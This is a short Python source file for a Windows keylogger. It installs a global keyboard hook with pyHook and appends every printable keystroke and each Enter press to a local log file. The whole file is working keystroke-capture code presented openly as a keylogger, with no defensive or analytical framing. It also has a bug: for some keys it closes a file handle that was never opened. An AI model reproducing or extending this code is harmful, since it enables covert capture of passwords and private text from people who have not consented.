import sys,logging
import pythoncom,pyHook
import os

def OnKeyboardEvent(event): 

    #storing printable characters
    if event.Ascii > 31:
        #read character pressed
        f = open('C:\Users\Admin\Desktop\keylogger\log.txt','a')
        keylogs = chr(event.Ascii)
        
        #write to log file 
        f.write(keylogs)
        
    '''if event.Ascii == 8:
        f = open('C:\Users\Admin\Desktop\keylogger\log.txt','a')
        size = os.path.getsize('C:\Users\Admin\Desktop\keylogger\log.txt')
        f.seek(size-1)
        f.write("")'''

    if event.Ascii == 13:
        f = open('C:\Users\Admin\Desktop\keylogger\log.txt','a')
        f.write("\n")

    #close log file
    f.close()

#pyHook provides callback for global keystrokes
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
